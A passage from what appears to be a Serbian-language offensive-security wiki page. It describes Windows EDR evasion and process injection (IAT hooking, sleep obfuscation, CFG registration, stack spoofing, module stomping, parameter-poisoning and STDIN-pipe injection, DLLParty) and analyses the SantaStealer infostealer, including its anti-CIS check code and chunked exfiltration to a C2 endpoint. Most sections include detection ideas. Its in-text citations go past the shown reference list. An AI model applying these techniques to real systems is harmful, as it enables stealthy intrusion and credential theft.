- Integritet IAT-a: unosi koji pokazuju na adrese koje nisu deo image-a (heap/anon); periodična provera import pointer-a.
- Anomalije steka: return adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na PIC koji nije deo image-a; nedosledno poreklo RtlUserThreadStart-a.
- Telemetrija loader-a: upisi u IAT unutar procesa, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX region-i kreirani pri učitavanju.
- Izbegavanje image-load detekcije: ako se hook-uje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assembly-ja povezana sa događajima memory masking-a.

Povezani elementi i primeri
- Reflective loader-i koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## IAT Hooking pri učitavanju + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks pri učitavanju preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom** `ProcessImports()` tako što ćeš pokazivač loader-a na `GetProcAddress` zameniti prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (postojani PIC objekat) koji ostaje aktivan nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi hash-based hook lookup poput `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj ciljeve hook-ova pri linkovanju pomoću Crystal Palace unosa `addhook "MODULE$Func" "hook"`. Hook ostaje validan jer se nalazi unutar rezidentnog PICO-a.

Time se postiže **IAT redirekcija pri učitavanju** bez patchovanja code sekcije učitanog DLL-a nakon učitavanja.

### Forsiranje hookable import-a kada cilj koristi PEB-walking

Hook-ovi pri učitavanju se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API-je pomoću PEB-walk + hash (bez import unosa), forsiraj stvarni import kako bi loader-ov put `ProcessImports()` mogao da ga obradi:

- Zameni hash-based razrešavanje export-a (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom poput `&WaitForSingleObject`.
- Kompajler će emitovati IAT unos, čime se omogućava presretanje dok reflective loader razrešava importe.

### Sleep/idle obfuscation u Ekko stilu bez patchovanja `Sleep()`

Umesto patchovanja funkcije `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Tokom dugih čekanja, obmotaj poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji dok je neaktivan:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakaže niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 šifrovanje preko `advapi32!SystemFunction032` nad celim mapiranim image-om → obavi blokirajuće čekanje → RC4 dešifrovanje → **vrati dozvole za svaku sekciju** prolaskom kroz PE sekcije → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`; kloniraj ga u više frame-ova i podesi registre (`Rip/Rcx/Rdx/R8/R9`) kako bi se pozvao svaki korak.

Operativni detalj: vrati „success“ za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od scanner-a tokom perioda neaktivnosti i izbegava prepoznatljiv potpis „patchovanog `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi callback-ova `CreateTimerQueueTimer` koji upućuju na `NtContinue`.
- `advapi32!SystemFunction032` primenjen na velike, kontinualne buffere veličine image-a.
- `VirtualProtect` nad velikim opsegom, praćen vraćanjem prilagođenih dozvola za svaku sekciju.

### Runtime CFG registracija za sleep-obfuscation gadget-e

Na CFG-om omogućenim ciljevima, prvi indirektni skok na gadget usred funkcije, poput `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces uz `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken-style chain-ovi radili u ojačanim procesima:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **osnovi image-a** i obuhvata **celu veličinu image-a**.
- Za ručno mapirane/PIC/stomped regione koristi **allocation base** i veličinu alokacije.
- Označi ne samo dispatch gadget, već i export-e do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ovi), kao i sve izvršne sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Time se ROP/JOP-style sleep chain-ovi pretvaraju iz „radi samo u procesima bez CFG-a“ u ponovo upotrebljivu primitivu za `explorer.exe`, browser-e, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za uspavane thread-ove

Potpuna zamena `CONTEXT`-a je upadljiva i može da izazove probleme na sistemima sa CET Shadow Stack-om, jer spoofovani `Rip` i dalje mora da odgovara hardverskom shadow stack-u. Bezbedniji sleep-masking obrazac je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pomoću `NtQueryInformationThread` pročitaj granice njegovog steka (`StackBase`, `StackLimit`) iz `NT_TIB` / TEB-a.
- Napravi rezervnu kopiju stvarnog TEB/TIB-a trenutnog thread-a.
- Uhvatiti stvarni kontekst uspavanog thread-a pomoću `GetThreadContext`.
- Kopiraj **samo** stvarni `Rip` u spoof kontekst, ostavljajući spoofovani `Rsp`/stanje steka nepromenjenim.
- Tokom perioda spavanja kopiraj `NT_TIB` spoof thread-a u TEB trenutnog thread-a kako bi stack walker-i obavljali unwind unutar legitimnog opsega steka.
- Po završetku čekanja vrati originalni TIB i kontekst thread-a.

Time se zadržava CET-usaglašen instruction pointer, a EDR stack walker-i koji se oslanjaju na metapodatke TEB steka za proveru unwind-a bivaju navedeni na pogrešan trag.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovanog pomoćnog thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Napravi pomoćni thread sa `NtTestAlert` kao entrypoint-om.
- Queued pripremljene `CONTEXT` frame-ove/APC-ove pomoću `NtQueueApcThread` i isprazni ih pomoću `NtAlertResumeThread`.
- Čuvaj stanje chain-a na heap-u, a ne na steku pomoćnog thread-a, kako bi se izbeglo iscrpljivanje podrazumevanog steka thread-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da atomarno signaliziraš početni događaj i blokiraš thread.
- Suspenduj glavni thread pre vraćanja TIB-a/konteksta (`NtSuspendThread` → restore → `NtResumeThread`) kako bi se smanjio vremenski prozor u kom scanner može da uhvati delimično obnovljen stek.

Ovim se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom pomoćnog thread-a/APC-a, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko poziva `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u granice steka TEB/TIB-a trenutnog thread-a.
- Nizovi poziva `NtQueueApcThread`/`NtAlertResumeThread` koji indirektno stižu do `SystemFunction032`, `VirtualProtect` ili pomoćnih funkcija za vraćanje dozvola sekcija.
- Ponavljana upotreba kratkih gadget potpisa poput `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivota unutar potpisanih modula.


## Precizno module stomping

Module stomping izvršava payload-e iz **`.text` sekcije DLL-a koji je već mapiran unutar ciljnog procesa**, umesto alokacije očigledne privatne izvršne memorije ili učitavanja novog žrtvenog DLL-a. Cilj za prepisivanje treba da bude **učitan, disk-backed image** čiji code prostor može da primi payload bez oštećivanja code path-ova koji su i dalje potrebni procesu.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping nad uobičajenim modulima poput `uxtheme.dll` ili `comctl32.dll` je nepouzdan: DLL možda nije učitan u udaljenom procesu, a premali code region može da sruši proces. Pouzdaniji postupak:

1. Nabroj module ciljnog procesa i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo napravi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj DLL-ove na disku i uporedi veličinu PE sekcije **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu izvršne sekcije **nakon mapiranja u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA eksportovane funkcije kao početni offset za stomping.
5. Izračunaj **oblast uticaja**: ako payload premašuje granicu izabrane funkcije, prebrisaće susedne export-e koji su raspoređeni iza nje u memoriji.

Tipični pomoćni alati za recon/izbor koji se koriste u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljeni proces da biste izbegli telemetriju za `LoadLibrary`/neočekivana učitavanja image-a.
- Dajte prednost exportima koje ciljna aplikacija retko izvršava; u suprotnom, uobičajene putanje koda mogu naići na izmenjene bajtove pre ili posle kreiranja threada.
- Za velike implantate često je potrebno promeniti ugrađivanje shellcode-a sa string literala na **inicijalizator niza bajtova/u vitičastim zagradama** kako bi ceo bafer bio pravilno predstavljen u izvornom kodu injectora.

Ideje za detekciju
- Udaljeni upisi u izvršne stranice podržane image-om (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto u češće privatne RWX/RX alokacije.
- Ulazne tačke exporta čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni threadovi ili preusmeravanja konteksta koji započinju izvršavanje unutar legitimnog DLL exporta čiji su početni bajtovi nedavno izmenjeni.
- Sumnjivi nizovi poziva `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **ubacivanja u proces / izbegavanja EDR-a** koja zaobilazi klasičnu putanju udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre `CreateProcessW` u child proces** i čuva ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Prenosnici koji mogu biti zatrovani i koje kopira `CreateProcessW`

Korisni prenosnici su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja prenosnika:

- `lpCommandLine` mora pokazivati na **upisivu memoriju** za `CreateProcessW`, a ograničen je na **32,767 Unicode znakova**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode blok okruženja sastavljen od uzastopnih nizova `NAME=VALUE\0` koji se završavaju dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba smatrati detaljem implementacije, a ne stabilnim dokumentovanim ugovorom.

Time se obično kreiranje procesa pretvara u **primitiv za prenos payload-a**. Operater kreira child proces sa početnim podacima pod kontrolom napadača i prepušta Windows-u da obavi kopiranje između procesa.

### Tok udaljenog pronalaženja bez udaljenih API-ja za upis

Nakon kreiranja child procesa, pronađite kopirani bafer pomoću primitiva **samo za čitanje**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavite `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitajte udaljeni `PEB`
3. Pratite `PEB.ProcessParameters`
4. Pročitajte `RTL_USER_PROCESS_PARAMETERS`
5. Koristite odabrani pokazivač:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalni tok:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Izvršavanje kopiranog bafera parametara

Kopirana oblast parametara je obično `RW`, a ne izvršiva. Uobičajeni P3 lanac je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih postupaka otmice niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Time se izbegava nekoliko API-ja koji se često nadziru zbog ubrizgavanja:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje nul-bajta i etapni shellcode

Sva tri nosača su **stringovi ili podaci nalik stringovima**, pa se sirovi payload koji sadrži `0x00` odseca tokom prenosa. Praktično zaobilazno rešenje je **prva etapa bez nul-bajtova** koja ponovo sastavlja konstante tokom izvršavanja, a zatim učitava proizvoljnu drugu etapu.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Ovo omogućava da prvi stepen napravi stringove na steku, API argumente, DLL putanje ili loader shellcode-a drugog stepena, bez ugrađivanja null bajtova u preneti parametar.

### API pozivi zasnovani na steku iz prvog stepena

Kada prvi stepen mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- održi `RSP` **poravnatim na 16 bajtova** pre poziva

Drugi stepen zatim može da se kopira sa steka u alokaciju `PAGE_READWRITE`, promeni zaštitu u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i na njega se može skočiti, čime se izbegava direktna RWX alokacija.

### Ideje za detekciju

Autori navode sledeće dobre prilike za threat hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kojima se **stranice parametara procesa menjaju tako da budu izvršne**
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljeno čitanje `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugačke vrednosti ili vrednosti sa visokom entropijom u `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` prilikom kreiranja procesa

### Napomene

- P3 je **trik za prenos između procesa**, a ne samostalni primitiv za izvršavanje: kopirani parametar i dalje zahteva promenu dozvole za izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno dolazi do sumnjivih primitiva kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

Za isporuku payload-a u **postojeći** Windows proces putem opisa niti, praćenu otimanjem povratne adrese niti koja čeka, pogledajte [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Interaktivni child konzole takođe može da se koristi kao **primitiv za prenos payload-a**. Injector preusmerava standardni ulaz child procesa na pipe i šalje marker, a zatim shellcode. Nakon što program konzole učita podatke u sopstvenu privatnu memoriju, injector pronalazi taj bafer, čini ga izvršnim i preusmerava nit child procesa na njega. Time se izbegavaju `VirtualAllocEx` i `WriteProcessMemory`, ali ovo je i dalje process injection, a ne opšti EDR bypass.<sup>[[41]](#references)</sup>

Uprkos opisu „named-pipe“, referentna implementacija poziva `CreatePipe`, čime se kreira **anonymous pipe**. Windows interno implementira anonymous pipe-ove pomoću pipe objekata sa jedinstvenim imenima, ali PoC ne bira putanju `\\.\pipe\<name>` niti poziva `CreateNamedPipe`. Kreira nasleđene handle-ove sa podrazumevanim deskriptorom bezbednosti, postavlja read handle u `STARTUPINFO.hStdInput`, uključuje `STARTF_USESTDHANDLES` i pokreće novi child uz omogućeno nasleđivanje handle-ova. Zato ovaj PoC pokreće prosleđeni izvršni fajl konzole; ne povezuje svoj pipe sa postojećim procesom.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referentni tok rada

Implementacija koristi sledeći niz koraka:<sup>[[41]](#references)</sup>

1. Kreirati parove anonymous pipe-ova za `STDIN` i `STDOUT` child procesa. Isključiti nasleđivanje za dva handle-a na strani parent procesa i zatvoriti duplikate handle-ova na strani child procesa u parent procesu nakon kreiranja procesa.
2. Pokrenuti interaktivni izvršni fajl kao što je `netsh.exe` ili `nslookup.exe` pomoću `CREATE_NEW_CONSOLE`. Child nasleđuje preusmerene standardne handle-ove.
3. Poslati ceo binarni niz `rawData` pomoću `WriteFile` kroz handle `STDIN` na strani parent procesa. Program konzole troši bajtove i ostavlja kopiju u jednom od svojih privatnih commit-ovanih regiona.
4. Proći kroz adresni prostor child procesa pomoću `VirtualQueryEx`, pročitati kandidate za regione `MEM_PRIVATE` pomoću `ReadProcessMemory` i potražiti marker na početku `rawData`.
5. Promeniti zaštitu otkrivenog bafera u `PAGE_EXECUTE_READWRITE` pomoću `VirtualProtectEx`.
6. Identifikovati glavnu nit, suspendovati je, postaviti `RIP` na `found_address + 0x19` pomoću `NtSetContextThread` i nastaviti njeno izvršavanje.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Priložena implementacija je specifična za x64: menja `CONTEXT.Rip`, a ugrađeni payload je x64 shellcode. `rawData` počinje markerom od 25 bajtova, pa izvršni bajtovi počinju na heksadecimalnom pomeraju `0x19`. Pri zameni payloada sačuvajte taj raspored ili zajedno ažurirajte marker, vektor za pretragu, veličinu niza i pomeraj izvršavanja. Komentari u izvornom kodu navode i `0x0A`, `0x0D` i `0x1A` kao loše znakove. Ovaj postupak ne menja token niti privilegije child procesa.<sup>[[41]](#references)</sup>

Za primere malih nativnih pomoćnih programa i obrazaca za kompajliranje payloada pogledajte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection putem callback-a thread pool-a bez shellcode-a (DLLParty)

DLLParty prilagođava injection u thread pool u stilu PoolParty-ja tako da postojeći worker ciljnog procesa pozove `LoadLibraryA`, umesto da izvrši ubačeni callback stub. Njegov primitiv za dispečovanje je `TP_DIRECT` dovršenje stavljeno u I/O completion port ciljnog pool-a. Ovo ne zaobilazi dozvole procesa: PoC poziva `OpenProcess(PROCESS_ALL_ACCESS)` i zahteva memoriju ciljnog procesa koja se može čitati i pisati, kao i duplirane handle-ove za worker factory i completion port.<sup>[[46]](#references)[[47]](#references)</sup>

U Windows x64, worker prosleđuje pokazivač na `TP_CALLBACK_INSTANCE`, smešten na steku, kroz `RCX` — prvi argument callback-a. `LoadLibraryA` tumači taj isti pokazivač kao `LPCSTR`. Na testiranoj putanji, `TppWorkerThread` postavlja pokazivač na `RSP+0x178`, dok se prvi uobičajeni upis u taj objekat obavlja na `RSP+0x1d0`. Zato se putanja do DLL-a završena nulom, koja staje u ovaj prefiks od 0x58 bajtova, može smestiti na početak instance, a da ne bude prepisana pre dispečovanja. Ovo je zapažanje specifično za određenu verziju, a ne dokumentovana garancija Windows ABI-ja.<sup>[[46]](#references)[[47]](#references)</sup>

Referentni postupak je sledeći:<sup>[[46]](#references)[[47]](#references)</sup>

1. Nabrojte handle-ove ciljnog procesa pomoću `NtQuerySystemInformation(SystemHandleInformation)` i identifikujte `TpWorkerFactory` ispitivanjem tipova objekata. Duplirajte handle worker factory-ja i upitajte `WorkerFactoryBasicInformation`; `StartParameter` daje udaljeni `TP_POOL`. Preskočite factory-je kod kojih je `TotalWorkerCount == 0`.
2. Pročitajte `TP_POOL.CompletionPort` i prođite kroz privatnu listu worker-a pool-a. U testiranoj x64 verziji Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), glava liste je na `pool+0x60`; svaka veza je na `worker+0x10`, pa je slot callback-instance na `worker+0x38` jednak `link+0x28`. PoC proverava poravnanje pokazivača, uzajamnost veza, pripadnost pool-u, nenulte ID-jeve niti, ponovljene čvorove i stabilnost glave liste.
3. Upišite putanju do DLL-a u **svaki** pronađeni worker slot, jer bilo koji worker može preuzeti stavljeno dovršenje. Smestite `TP_DIRECT` sa `Callback = LoadLibraryA` u memoriju ciljnog procesa koja može da se upisuje. PoC koristi `last_slot-0x500` na steku worker-a umesto `VirtualAllocEx`; taj pomeraj je eksperimentalan i ne sme da se preklapa sa aktivnim podacima na steku.
4. Duplirajte handle completion port-a ciljnog procesa i pozovite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adresa udaljenog `TP_DIRECT` objekta je completion key. Postojeći worker zatim poziva `LoadLibraryA` koristeći prepisani pokazivač callback-instance i učitava DLL kojem ciljni proces već može da pristupi.

PoC prima PID ciljnog procesa (`DLLParty.exe <target_pid>`) i koristi hardkodiranu putanju do DLL-a u `DLLParty.cpp`; pre kompajliranja x64 izvršne datoteke podesite putanju kojoj ciljni proces može da pristupi. Koristi i adresu `LoadLibraryA` iz sopstvenog procesa kao udaljeni callback, pa pretpostavlja da ta adresa važi i u ciljnom procesu. Kod ne proverava da li je putanja kraća od prefiksa od 0x58 bajtova niti da li je obilazak worker-a pronašao slot pre pristupa poslednjem elementu. Ponovo proverite privatne pomeraje, raspored steka i prostor za upis za verziju ciljnog procesa. Izostavljanje `CreateRemoteThreadEx`, shellcode-a i `VirtualAllocEx` ne uklanja upise između procesa niti telemetriju učitavanja DLL-a.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktike SantaStealer-a za izbegavanje bez datoteka i krađu kredencijala

SantaStealer (poznat i kao BluelineStealer) pokazuje kako savremeni info-stealer-i objedinjuju AV bypass, anti-analysis i pristup kredencijalima u jednom postupku.<sup>[[24]](#references)</sup>

### Provera rasporeda tastature i odlaganje u sandbox-u

- Konfiguraciona zastavica (`anti_cis`) nabraja instalirane rasporede tastature preko `GetKeyboardLayoutList`. Ako pronađe ćirilični raspored, uzorak pravi prazan marker `CIS` i prekida rad pre pokretanja stealers komponenti. Tako se obezbeđuje da se ne aktivira u isključenim lokalima, a pritom ostavlja trag koristan za pretragu.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svako ime prilagođenom kliznom kontrolnom sumom i upoređuje je sa ugrađenim listama za blokiranje debagera/sandbox okruženja; ponavlja kontrolnu sumu nad imenom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (donju granicu broja procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi otkrivanja VirtualBox dodataka i vrši vremenske provere oko čekanja kako bi uočila izvršavanje instrukciju po instrukciju. Svako poklapanje prekida izvršavanje pre pokretanja modula.

### Fileless pomoćni program + dvostruko ChaCha20 reflektivno učitavanje

- Primarni DLL/EXE sadrži Chromium pomoćni program za prikupljanje akreditiva koji se ili zapisuje na disk ili ručno mapira u memoriju; u fileless režimu samostalno razrešava uvoze i relokacije, tako da se ne zapisuju nikakvi artefakti pomoćnog programa.
- Taj pomoćni program čuva DLL druge faze, dvaput šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Nakon oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva export funkcije `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, preuzete iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Rutine ChromElevator koriste reflektivno hollowing procesa putem direktnih sistemskih poziva kako bi se ubacile u aktivan Chromium pregledač, nasledile AppBound Encryption ključeve i dešifrovale lozinke/kolačiće/podatke o kreditnim karticama direktno iz SQLite baza podataka, uprkos zaštitama ABE.


### Modularno prikupljanje u memoriji i HTTP exfil u segmentima

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, snimci ekrana, dokumenti, ekstenzije pregledača itd.). Svaka nit upisuje rezultate u deljene bafere i prijavljuje broj svojih fajlova nakon čekanja od približno 45 sekundi na niti.
- Po završetku, sve se pakuje u ZIP pomoću statički povezane biblioteke `miniz` kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u segmentima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažno predstavljajući granicu pregledača `multipart/form-data` (`----WebKitFormBoundary***`). Svaki segment dodaje `User-Agent: upload`, `auth: <build_id>`, opcioni `w: <campaign_tag>`, a poslednji segment dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
